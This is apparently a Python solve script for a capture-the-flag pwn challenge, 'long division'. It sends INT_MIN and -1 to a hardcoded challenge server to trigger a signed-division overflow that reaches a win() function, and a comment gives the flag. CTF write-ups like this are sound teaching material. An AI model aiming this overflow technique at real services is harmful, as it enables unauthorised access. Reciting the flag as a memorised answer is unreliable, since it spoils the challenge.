#!/usr/bin/env python3
"""
LIT CTF 2026 — pwn — "long division"   (nc 136.115.87.65 31777)

Bug: classic INT_MIN / -1 signed-overflow.

main() reads a,b as 64-bit (scanf %lld), validates each is a *valid int32*
(-2147483648 .. 2147483647) and that b != 0. It then divides in 64-bit
(`cqo; idiv rcx`) and checks whether the *result* fits in int32 — if NOT, it
calls win() (which fopen/fgets/printf's flag.txt).

-2147483648 / -1 = 2147483648, which is INT_MAX+1 -> doesn't fit in int32
-> overflow check fires -> win() -> flag.
"""
import socket, time

HOST, PORT = "136.115.87.65", 31777

def main():
    s = socket.socket(); s.settimeout(10); s.connect((HOST, PORT))
    time.sleep(0.4); s.sendall(b"-2147483648\n")   # a = INT_MIN
    time.sleep(0.3); s.sendall(b"-1\n")            # b = -1
    time.sleep(0.8)
    out = b""
    while True:
        try:
            c = s.recv(4096)
            if not c: break
            out += c
        except socket.timeout:
            break
    print(out.decode(errors="replace"))
    # -> signed division overflow -> LITCTF{1nt_div1si0n_0v3rflow}

if __name__ == "__main__":
    main()
